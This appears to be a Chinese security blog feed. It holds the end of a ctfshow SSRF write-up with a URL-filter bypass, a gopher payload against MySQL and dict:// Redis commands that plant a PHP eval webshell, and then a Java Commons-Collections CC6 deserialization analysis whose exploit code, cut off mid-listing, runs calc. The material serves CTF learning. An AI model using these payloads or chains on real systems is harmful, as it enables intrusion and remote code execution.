class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$url</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$x</span><span class="token operator">=</span><span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^http:\/\/ctf\..*show$/i'</span><span class="token punctuation">,</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://c.runoob.com/front-end/7625/#!flags=&amp;re=%5E(a%7Cb)*%3F%24">正则解析网站</a></p><p><img src="/../../../pic/Pasted%20image%2020221229175056.png"></p><p>要求 host 以 <a href="http://ctf/">http://ctf</a>. 开头，以 show 结尾</p><p>payload</p><pre class="line-numbers language-none"><code class="language-none">[POST]url=http://ctf.@127.0.0.1/flag.php#show<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="9-web359"><a href="#9-web359" class="headerlink" title="9. web359"></a>9. web359</h2><p>打无密码的mysql <a href="https://hackmd.io/@Lhaihai/H1B8PJ9hX#Gopher-%E6%94%BB%E5%87%BBmysql">Gopher 攻击 Mysql</a></p><p>使用工具 <a href="https://github.com/tarunkant/Gopherus">Gopherus</a></p><p><img src="/../../../pic/Pasted%20image%2020221229181639.png"></p><p>在源代码中发现 url 请求</p><p>使用 gopherus 生成 payload</p><p><img src="/../../../pic/Pasted%20image%2020221229183201.png"></p><p>对生成的 payload 再进行一次 URL 编码</p><pre class="line-numbers language-none"><code class="language-none">[POST]returl=gopher://127.0.0.1:3306/_%25a3%2500%2500%2501%2585%25a6%25ff%2501%2500%2500%2500%2501%2521%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2572%256f%256f%2574%2500%2500%256d%2579%2573%2571%256c%255f%256e%2561%2574%2569%2576%2565%255f%2570%2561%2573%2573%2577%256f%2572%2564%2500%2566%2503%255f%256f%2573%2505%254c%2569%256e%2575%2578%250c%255f%2563%256c%2569%2565%256e%2574%255f%256e%2561%256d%2565%2508%256c%2569%2562%256d%2579%2573%2571%256c%2504%255f%2570%2569%2564%2505%2532%2537%2532%2535%2535%250f%255f%2563%256c%2569%2565%256e%2574%255f%2576%2565%2572%2573%2569%256f%256e%2506%2535%252e%2537%252e%2532%2532%2509%255f%2570%256c%2561%2574%2566%256f%2572%256d%2506%2578%2538%2536%255f%2536%2534%250c%2570%2572%256f%2567%2572%2561%256d%255f%256e%2561%256d%2565%2505%256d%2579%2573%2571%256c%254a%2500%2500%2500%2503%2573%2565%256c%2565%2563%2574%2520%2522%253c%253f%2570%2568%2570%2520%2565%2576%2561%256c%2528%2524%255f%2550%254f%2553%2554%255b%2530%255d%2529%253b%253f%253e%2522%2520%2569%256e%2574%256f%2520%256f%2575%2574%2566%2569%256c%2565%2520%2520%2522%252f%2576%2561%2572%252f%2577%2577%2577%252f%2568%2574%256d%256c%252f%2573%2568%2565%256c%256c%252e%2570%2568%2570%2522%2501%2500%2500%2500%2501<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/../../../pic/Pasted%20image%2020221229183150.png"></p><p>访问 shell.php 获得 webshell</p><h2 id="10-web360"><a href="#10-web360" class="headerlink" title="10. web360"></a>10. web360</h2><p>ssrf打redis，基本上四种攻击方式：</p><ul><li>写webshell</li><li>写ssh公钥</li><li>写contrab计划任务反弹shell</li><li>主从复制</li></ul><p><a href="https://hackmd.io/@Lhaihai/H1B8PJ9hX#Gopher-%E6%94%BB%E5%87%BBRedis%EF%BC%88%E4%B8%80%EF%BC%89">Gopherus 攻击 Redis</a></p><p>先使用 dict 进行手打</p><p>探测是否需要认证</p><pre class="line-numbers language-none"><code class="language-none">[POST]url=dict://127.0.0.1:6379/info<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/../../../pic/Pasted%20image%2020221229184714.png"></p><p>需要的话使用 <code>dict://127.0.0.1:6379/auth:xxx</code> 爆破一下</p><p>设置 redis 的工作路径用于保存数据</p><pre class="line-numbers language-none"><code class="language-none">[POST]url=dict://127.0.0.1:6379/config:set:dir:/var/www/html/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>设置保存文件名</p><pre class="line-numbers language-none"><code class="language-none">[POST]url=dict://127.0.0.1:6379/config:set:dbfilename:shell.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>使用十六进制写入 shell</p><pre class="line-numbers language-none"><code class="language-none">[POST]url=dict://127.0.0.1:6379/set:shell:"\x3c\x3f\x70\x68\x70\x20\x65\x76\x61\x6c\x28\x24\x5f\x50\x4f\x53\x54\x5b\x30\x5d\x29\x3b\x3f\x3e"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>保存 shell 到文件中</p><pre class="line-numbers language-none"><code class="language-none">[POST]url=dict://127.0.0.1:6379/save<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>访问 shell.php 获得 shell</p><p>也可以使用 gopherus 生成 payload 一样将后面的部分进行 URL 编码</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://hackmd.io/@Lhaihai/H1B8PJ9hX#%E6%BC%8F%E6%B4%9E%E5%9C%BA%E6%99%AF">https://hackmd.io/@Lhaihai/H1B8PJ9hX#%E6%BC%8F%E6%B4%9E%E5%9C%BA%E6%99%AF</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF 刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF 秀 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java 反序列化 Commons-Collections 篇 CC6 链</title>
      <link href="/2023/01/25/skilllearning/java-an-quan/java-fan-xu-lie-hua/commons-collections-pian/java-fan-xu-lie-hua-commons-collections-pian-cc6-lian/"/>
      <url>/2023/01/25/skilllearning/java-an-quan/java-fan-xu-lie-hua/commons-collections-pian/java-fan-xu-lie-hua-commons-collections-pian-cc6-lian/</url>
      
        <content type="html"><![CDATA[<h1 id="Java-反序列化-Commons-Collections-篇-CC6-链"><a href="#Java-反序列化-Commons-Collections-篇-CC6-链" class="headerlink" title="Java 反序列化 Commons-Collections 篇 CC6 链"></a>Java 反序列化 Commons-Collections 篇 CC6 链</h1><h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h2><p>CC6 链与 CC1 链都是利用的 LazyMap.get()，与 CC1 链使用 AnnotationInvocationHandler 不同的是，CC6 使用的是 TiedMapEntry + HashMap 来触发</p><p>TiedMapEnry 是 Commons-Collections 中自带的，因此 CC6 链的利用不限于 Java 版本</p><h2 id="2-环境搭建"><a href="#2-环境搭建" class="headerlink" title="2. 环境搭建"></a>2. 环境搭建</h2><ul><li>Java 17.0.5</li><li>commons-collections 3.2.1</li><li>maven 3.8.7</li></ul><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>commons-collections<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>commons-collections<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>3.2.1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3-CC6-链分析"><a href="#3-CC6-链分析" class="headerlink" title="3. CC6 链分析"></a>3. CC6 链分析</h2><p>LazyMap.get() 部分就不赘述了，直接去看触发的部分</p><h3 id="3-1-触发-LazyMap-get"><a href="#3-1-触发-LazyMap-get" class="headerlink" title="3.1 触发 LazyMap.get()"></a>3.1 触发 LazyMap.get()</h3><ul><li>TiedMapEntry</li></ul><p><img src="/../../../../../pic/image-20230125221150338.png"></p><p>没什么弯弯绕绕的，实例化 TiedMapEntry 测试一下</p><ul><li>Exploit</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">org<span class="token punctuation">.</span>example</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span></span><span class="token class-name">Transformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ChainedTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ConstantTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">InvokerTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>keyvalue<span class="token punctuation">.</span></span><span class="token class-name">TiedMapEntry</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>map<span class="token punctuation">.</span></span><span class="token class-name">LazyMap</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Exploit</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span><span class="token punctuation">,</span> <span class="token class-name">NoSuchFieldException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span> <span class="token punctuation">{</span>        <span class="token comment">// 命令执行</span>        <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token punctuation">{</span>                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getMethod"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"calc"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">}</span><span class="token punctuation">;</span>        <span class="token class-name">ChainedTransformer</span> chainedTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 实例化 lazyMap</span>        <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">&gt;</span></span> hashMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Map</span> lazyMap <span class="token operator">=</span> <span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>hashMap<span class="token punctuation">,</span> chainedTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 实例化 tiedMapEntry</span>        <span class="token class-name">TiedMapEntry</span> tiedMapEntry <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TiedMapEntry</span><span class="token punctuation">(</span>lazyMap<span class="token punctuation">,</span> <span class="token string">"key"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 利用 tiedMapEntry.getValue() 触发 LazyMap.get()</span>        tiedMapEntry<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果</p><p><img src="/../../../../../pic/image-20230125222532965.png"></p><p>向上寻调用 TiedMapEntry.getValue() 的位置</p><p><img src="/../../../../../pic/image-20230125223102137.png"></p><p>TiedMapEntry.hashCode() 就对此进行了调用，使用了 hashCode 这个链子基本就已经找完了，剩下的部分直接拿 HashMap 补上</p><p>先使用 HashMap.put() 进行测试，该方法会去执行 key 中的 hashCode 方法</p><ul><li>Exploit</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">org<span class="token punctuation">.</span>example</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span></span><span class="token class-name">Transformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ChainedTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ConstantTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">InvokerTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>keyvalue<span class="token punctuation">.</span></span><span class="token class-name">TiedMapEntry</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>map<span class="token punctuation">.</span></span><span class="token class-name">LazyMap</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Exploit</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span><span class="token punctuation">,</span> <span class="token class-name">NoSuchFieldException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span> <span class="token punctuation">{</span>        <span class="token comment">// 命令执行</span>        <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token punctuation">{</span>                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getMethod"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"calc"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">}</span><span class="token punctuation">;</span>        <span class="token class-name">ChainedTransformer</span> chainedTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 实例化 lazyMap</span>        <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">&gt;</span></span> hashMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Map</span> lazyMap <span class="token operator">=</span> <span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>hashMap<span class="token punctuation">,</span> chainedTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 实例化 tiedMapEntry</span>        <span class="token class-name">TiedMapEntry</span> tiedMapEntry <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TiedMapEntry</span><span class="token punctuation">(</span>lazyMap<span class="token punctuation">,</span> <span class="token string">"key"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 利用 HashMap 触发 hashCode</span>        <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">&gt;</span></span> expHashMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        expHashMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>tiedMapEntry<span class="token punctuation">,</span> <span class="token string">"value"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果</p><p><img src="/../../../../../pic/image-20230125223523410.png"></p><p>成功实现了命令执行</p><h3 id="3-2-完整链子"><a href="#3-2-完整链子" class="headerlink" title="3.2 完整链子"></a>3.2 完整链子</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">-&gt;</span> <span class="token class-name">HashMap</span><span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-&gt;</span> <span class="token class-name">TiedMapEntry</span><span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token class-name">TiedMapEntry</span><span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-&gt;</span> <span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-&gt;</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-&gt;</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-&gt;</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="4-CC6-链-EXP-编写"><a href="#4-CC6-链-EXP-编写" class="headerlink" title="4. CC6 链 EXP 编写"></a>4. CC6 链 EXP 编写</h2><p>由于在执行 put() 时就会触发命令执行，所以需要通过反射进行一次修改</p><ul><li>Exploit</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">org<span class="token punctuation">.</span>example</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span></span><span class="token class-name">Transformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ChainedTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ConstantTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">InvokerTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>keyvalue<span class="token punctuation">.</span></span><span class="token class-name">TiedMapEntry</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>map<span class="token punctuation">.</span></span><span class="token class-name">LazyMap</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span></span><span 